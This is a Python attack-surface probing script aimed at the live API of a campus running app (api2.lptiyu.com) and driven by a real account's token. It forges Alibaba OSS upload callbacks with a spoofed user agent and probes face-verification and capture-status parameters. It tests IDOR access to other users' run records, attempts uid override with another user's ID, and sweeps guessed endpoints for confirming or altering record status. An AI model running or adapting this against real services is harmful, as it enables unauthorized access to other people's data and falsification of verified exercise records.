# -*- coding: utf-8 -*-
"""服务器端攻击面探测: ossCallback 伪造 / getCaptureStatus / faceVerify / IDOR 越权
只读探测(不提交), 逐项返回接口真实行为。
"""
import json
import os
import sys
import time
import urllib.parse
import base64
import http.client

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE)
os.environ.setdefault("LEPAO2_CONFIG", os.path.join(BASE, "config.json"))

from lepao.accounts import AccountRegistry
from lepao.auth import AuthState


def main():
    sel = None
    if "--member" in sys.argv:
        sel = sys.argv[sys.argv.index("--member") + 1]
    reg = AccountRegistry(os.path.join(BASE, "config.json"))
    key = reg.resolve(sel)
    auth = AuthState(reg, key)
    client = auth.make_client(pace=0.3)
    uid = auth.uid
    print(f"[探测] 成员 {auth.label} uid={uid} token={auth.token[:8]}…")

    # ---------- 1. getCaptureStatus 完整参数探测 ----------
    print("\n=== [1] Run2/getCaptureStatus 参数探测 ===")
    now = int(time.time())
    param_sets = [
        {"start_time": str(now - 600), "distance": "1.0", "game_id": "1963",
         "point_ids": "23604,23605,23607,25550"},
        {"start_time": str(now - 600), "distance": "1.0", "game_id": "1963",
         "point_ids": "23604,23605,23607,25550", "capture_num": "0"},
        {"start_time": str(now - 600), "distance": "1.0", "game_id": "1963",
         "point_ids": "23604,23605,23607,25550", "record_id": "0"},
    ]
    for ps in param_sets:
        try:
            r = client.post("/v3/api.php/Run2/getCaptureStatus", ps)
            print(f"  参数 {ps}: {json.dumps(r, ensure_ascii=False)[:200]}")
        except Exception as e:
            print(f"  参数 {ps}: 异常 {e.__class__.__name__} {str(e)[:80]}")

    # ---------- 2. faceVerify 参数探测 ----------
    print("\n=== [2] Run2/faceVerify 参数探测 ===")
    face_sets = [
        {"type": "1"},
        {"type": "1", "game_id": "1963"},
        {"type": "1", "game_id": "1963", "start_time": str(now - 600)},
        {"type": "1", "game_id": "1963", "start_time": str(now - 600), "face_img": ""},
        {"type": "1", "game_id": "1963", "record_id": "513356"},
        {"verify_type": "1", "game_id": "1963"},
    ]
    for ps in face_sets:
        try:
            r = client.post("/v3/api.php/Run2/faceVerify", ps)
            print(f"  参数 {ps}: {json.dumps(r, ensure_ascii=False)[:200]}")
        except Exception as e:
            print(f"  参数 {ps}: 异常 {e.__class__.__name__} {str(e)[:80]}")

    # ---------- 3. ossCallback 伪造探测 ----------
    print("\n=== [3] WpIndex/ossCallback 伪造探测 ===")
    # OSS callback 是 OSS 服务器回掉接口, 表单字段来自 callbackBody
    cb_host = "api2.lptiyu.com"
    cb_path = "/v3/api.php/WpIndex/ossCallback"
    fake_body_variants = [
        # 标准 callback body (不含身份)
        urllib.parse.urlencode({
            "bucket": "lptiyu-data",
            "object": "Public/Upload/pic/run_photo_screenshotImage/2026-11-17/835/test.jpg",
            "etag": '"ABC123"',
            "size": "12345",
            "mimeType": "image/jpeg",
            "imageInfo.height": "480",
            "imageInfo.width": "640",
            "imageInfo.format": "jpg",
        }),
        # 加 uid / start_time
        urllib.parse.urlencode({
            "bucket": "lptiyu-data",
            "object": "Public/Upload/pic/run_photo_screenshotImage/2026-11-17/835/test.jpg",
            "etag": '"ABC123"',
            "size": "12345",
            "mimeType": "image/jpeg",
            "imageInfo.height": "480",
            "imageInfo.width": "640",
            "imageInfo.format": "jpg",
            "uid": str(uid),
            "start_time": str(now - 600),
            "record_id": "0",
        }),
    ]
    for i, body in enumerate(fake_body_variants):
        try:
            conn = http.client.HTTPSConnection(cb_host, timeout=15)
            conn.putrequest("POST", cb_path, skip_accept_encoding=True)
            conn.putheader("content-length", str(len(body)))
            conn.putheader("content-type", "application/x-www-form-urlencoded")
            conn.putheader("user-agent", "aliyun-oss-callback")
            conn.endheaders(body.encode())
            resp = conn.getresponse()
            raw = resp.read().decode("utf-8", "replace")
            conn.close()
            print(f"  [{i}] status={resp.status} body={raw[:200]}")
        except Exception as e:
            print(f"  [{i}] 异常 {e.__class__.__name__} {str(e)[:80]}")

    # ---------- 4. IDOR 越权探测 (读面) ----------
    print("\n=== [4] recordDetail IDOR 越权探测 ===")
    # 用当前 uid 尝试读其他 record_id (513335 是另一个记录)
    for rid in ("513356", "512487", "513335"):
        try:
            r = client.post("/v3/api.php/Run/recordDetailV270",
                            {"record_id": rid, "year_num": "2026"})
            got_uid = (r.get("uid") if isinstance(r, dict) else None)
            print(f"  record_id={rid} -> 返回 uid={got_uid} (本uid={uid}) "
                  f"status={r.get('record_status') if isinstance(r, dict) else '?'}")
        except Exception as e:
            print(f"  record_id={rid} -> 异常 {e.__class__.__name__}")

    # ---------- 5. 探测 recordDetail 是否接受 uid 参数覆盖(越权写面) ----------
    print("\n=== [5] recordDetail uid 覆盖探测 ===")
    try:
        r = client.post("/v3/api.php/Run/recordDetailV270",
                        {"record_id": "513356", "year_num": "2026", "uid": "21610741"})
        print(f"  覆盖 uid=21610741: {json.dumps(r, ensure_ascii=False)[:200]}")
    except Exception as e:
        print(f"  异常 {e.__class__.__name__}")

    # ---------- 6. 探测可能的记录状态修改/确认接口 ----------
    print("\n=== [6] 记录状态修改类接口探测 ===")
    mod_candidates = [
        "Run2/confirmRecord", "Run2/checkRecord", "Run2/verifyRecord",
        "Run2/passRecord", "Run2/auditRecord", "Run2/reAudit",
        "Run2/updateRecord", "Run2/fixRecord", "Run2/recapture",
        "Run2/addCaptureNum", "Run2/incCapture", "Run2/setCapture",
        "WpIndex/ossCallback", "Run2/ossCallback",
    ]
    for c in mod_candidates:
        path = f"/v3/api.php/{c}"
        try:
            r = client.post(path, {"record_id": "513356", "game_id": "1963"})
            if isinstance(r, dict):
                print(f"  [{c}] ★JSON status={r.get('status')} info={str(r.get('info'))[:50]!r}")
            else:
                print(f"  [{c}] 非JSON")
        except Exception:
            pass

    print("\n[探测] 完成")


if __name__ == "__main__":
    main()
